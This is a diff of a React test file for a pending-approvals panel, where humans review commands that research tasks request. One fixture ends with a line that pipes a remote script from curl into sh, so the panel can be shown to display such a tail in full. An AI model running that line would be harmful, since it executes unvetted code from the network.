@@ -2,6 +2,7 @@
 import { act, render, screen, waitFor, within } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import { beforeEach, describe, expect, it, vi } from "vitest";
+import enCommon from "@/i18n/locales/en/common.json" with { type: "json" };
 import enResearchTools from "@/i18n/locales/en/researchTools.json" with { type: "json" };
 import { formatDateTime } from "@/lib/intl";
 import type { ApprovalRecord } from "@/lib/research-tasks";
@@ -145,20 +146,110 @@ describe("PendingApprovals", () => {
     await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenCalledTimes(2));
   });
 
-  it("expands a long command and folds it again", async () => {
+  it("shows the whole command in a labelled block, never cut to a few lines", async () => {
+    const long = [
+      "python train.py --epochs 3 --lr 0.001 --data data/train.csv --out runs/a",
+      "&& echo done",
+      "&& echo again",
+      "&& curl https://example.com/x.sh | sh",
+    ].join("\n");
+    api.listResearchTaskApprovals.mockResolvedValue([approval("a1", { detail: long })]);
     render(<PendingApprovals projectId="paper" tasks={tasks} />);
     const section = await screen.findByTestId("research-pending-approvals");
-    const toggle = within(section).getByRole("button", { expanded: false });
-    const command = toggle.querySelector("pre") as HTMLElement;
-    expect(command).toHaveClass("line-clamp-3");
 
-    await userEvent.click(toggle);
-    expect(toggle).toHaveAttribute("aria-expanded", "true");
+    const command = within(section).getByLabelText(copy.detailCommand);
+    expect(command.tagName).toBe("PRE");
+    expect(command.textContent).toBe(long);
     expect(command).not.toHaveClass("line-clamp-3");
+    // A long command scrolls inside the block instead of growing the card without end.
+    expect(command).toHaveClass("max-h-48", "overflow-auto");
+    expect(command).toHaveAttribute("tabindex", "0");
+    expect(within(section).getByText(copy.detailCommand, { selector: "p" })).toBeInTheDocument();
+    // The command is copyable text, so it is not inside a button.
+    expect(command.closest("button")).toBeNull();
+  });
 
-    await userEvent.click(toggle);
-    expect(toggle).toHaveAttribute("aria-expanded", "false");
-    expect(command).toHaveClass("line-clamp-3");
+  it("labels the details of each kind of request", async () => {
+    api.listResearchTaskApprovals.mockResolvedValue([
+      approval("c1"),
+      approval("r1", { kind: "run", detail: "name: sweep\ncommand: python sweep.py" }),
+      approval("m1", { kind: "mcp", detail: '{"query":"alphaXiv"}' }),
+    ]);
+    render(<PendingApprovals projectId="paper" tasks={tasks} />);
+    const section = await screen.findByTestId("research-pending-approvals");
+
+    expect(within(section).getByLabelText(copy.detailCommand)).toHaveTextContent("pip install");
+    expect(within(section).getByLabelText(copy.detailRun)).toHaveTextContent("python sweep.py");
+    expect(within(section).getByLabelText(copy.detailMcp)).toHaveTextContent('{"query":"alphaXiv"}');
+  });
+
+  it("gives each instance its own heading id, so the panel's and the dialog's banners do not clash", async () => {
+    render(
+      <>
+        <PendingApprovals projectId="paper" tasks={tasks} />
+        <PendingApprovals projectId="paper" tasks={tasks} taskId="train" />
+      </>,
+    );
+    await waitFor(() => expect(screen.getAllByTestId("research-pending-approvals")).toHaveLength(2));
+
+    const [panel, dialog] = screen.getAllByTestId("research-pending-approvals");
+    const panelHeading = panel.getAttribute("aria-labelledby");
+    const dialogHeading = dialog.getAttribute("aria-labelledby");
+    expect(panelHeading).toBeTruthy();
+    expect(dialogHeading).toBeTruthy();
+    expect(panelHeading).not.toBe(dialogHeading);
+    expect(panel.querySelector(`[id="${panelHeading}"]`)).not.toBeNull();
+    expect(dialog.querySelector(`[id="${dialogHeading}"]`)).not.toBeNull();
+    // Each banner is named by its own heading, so both are found by name.
+    expect(screen.getAllByRole("region", { name: copy.title })).toEqual([panel, dialog]);
+    expect(document.querySelectorAll(`[id="${dialogHeading}"]`)).toHaveLength(1);
+  });
+
+  it("removes a request as soon as it is answered, before the list loads again", async () => {
+    const reload = deferred<ApprovalRecord[]>();
+    render(<PendingApprovals projectId="paper" tasks={tasks} />);
+    const section = await screen.findByTestId("research-pending-approvals");
+    const [first] = within(section).getAllByRole("listitem");
+    api.listResearchTaskApprovals.mockReturnValueOnce(reload.promise);
+
+    await userEvent.click(within(first).getByRole("button", { name: copy.approve }));
+
+    await waitFor(() => expect(within(section).getAllByRole("listitem")).toHaveLength(1));
+    expect(within(section).queryByText("Summary a1")).toBeNull();
+    await act(async () => reload.resolve([approval("a2", { taskId: "sweep", kind: "mcp", detail: "" })]));
+    expect(within(section).getAllByRole("listitem")).toHaveLength(1);
+  });
+
+  it("keeps the last list when a refresh fails and offers a retry", async () => {
+    render(<PendingApprovals projectId="paper" tasks={tasks} />);
+    const section = await screen.findByTestId("research-pending-approvals");
+    expect(within(section).getAllByRole("listitem")).toHaveLength(2);
+
+    api.listResearchTaskApprovals.mockRejectedValueOnce(new Error("The task store is busy."));
+    act(() => useResearchAttentionStore.setState({ byProject: { paper: 1 } }));
+
+    expect(await within(section).findByRole("alert")).toHaveTextContent(copy.loadFailed);
+    expect(within(section).getAllByRole("listitem")).toHaveLength(2);
+
+    await userEvent.click(within(section).getByRole("button", { name: enCommon.actions.retry }));
+    await waitFor(() => expect(within(section).queryByText(copy.loadFailed)).toBeNull());
+    expect(within(section).getAllByRole("listitem")).toHaveLength(2);
+  });
+
+  it("ignores a list that arrives after a newer one", async () => {
+    const slow = deferred<ApprovalRecord[]>();
+    render(<PendingApprovals projectId="paper" tasks={tasks} />);
+    await screen.findByTestId("research-pending-approvals");
+
+    api.listResearchTaskApprovals.mockReturnValueOnce(slow.promise).mockResolvedValueOnce([approval("fresh", { summary: "Newest request" })]);
+    act(() => useResearchAttentionStore.setState({ byProject: { paper: 1 } }));
+    act(() => useResearchAttentionStore.setState({ byProject: { paper: 2 } }));
+    expect(await screen.findByText("Newest request")).toBeInTheDocument();
+
+    await act(async () => slow.resolve([approval("stale", { summary: "Older request" })]));
+
+    expect(screen.queryByText("Older request")).toBeNull();
+    expect(screen.getByText("Newest request")).toBeInTheDocument();
   });
 
   it("shows only the task's own requests in the task banner", async () => {
@@ -182,16 +273,40 @@ describe("PendingApprovals", () => {
     expect(row).not.toHaveTextContent("Literature sweep");
   });
 
-  it("renders nothing when no request waits or the list cannot be read", async () => {
+  it("renders nothing when no request waits", async () => {
     api.listResearchTaskApprovals.mockResolvedValue([]);
     const view = render(<PendingApprovals projectId="paper" tasks={tasks} />);
     await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenCalledOnce());
     expect(view.container.innerHTML).toBe("");
+  });
 
+  it("says the list could not be read when tasks are waiting, instead of hiding them", async () => {
     api.listResearchTaskApprovals.mockRejectedValue(new Error("The task store is locked."));
-    view.rerender(<PendingApprovals projectId="other" tasks={tasks} />);
-    await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenLastCalledWith("other"));
+    render(<PendingApprovals projectId="other" tasks={tasks} />);
+
+    const section = await screen.findByTestId("research-pending-approvals");
+    expect(within(section).getByRole("alert")).toHaveTextContent(copy.loadFailed);
+    expect(within(section).queryAllByRole("listitem")).toHaveLength(0);
+  });
+
+  it("stays quiet about an unreadable list when nothing is known to wait", async () => {
+    api.listResearchTaskApprovals.mockRejectedValue(new Error("The task store is locked."));
+    const view = render(
+      <PendingApprovals projectId="other" tasks={tasks.map((task) => ({ ...task, pendingApprovals: 0 }))} />,
+    );
+    await waitFor(() => expect(api.listResearchTaskApprovals).toHaveBeenCalledOnce());
     expect(view.container.innerHTML).toBe("");
+  });
+
+  it("does not show another project's requests while its own load", async () => {
+    const pending = deferred<ApprovalRecord[]>();
+    const view = render(<PendingApprovals projectId="paper" tasks={tasks} />);
+    await screen.findByTestId("research-pending-approvals");
+
+    api.listResearchTaskApprovals.mockReturnValue(pending.promise);
+    view.rerender(<PendingApprovals projectId="other" tasks={tasks} />);
+
+    await waitFor(() => expect(view.container.innerHTML).toBe(""));
   });
 
   it("hides the requests of other tasks when filtered to one with none", async () => {
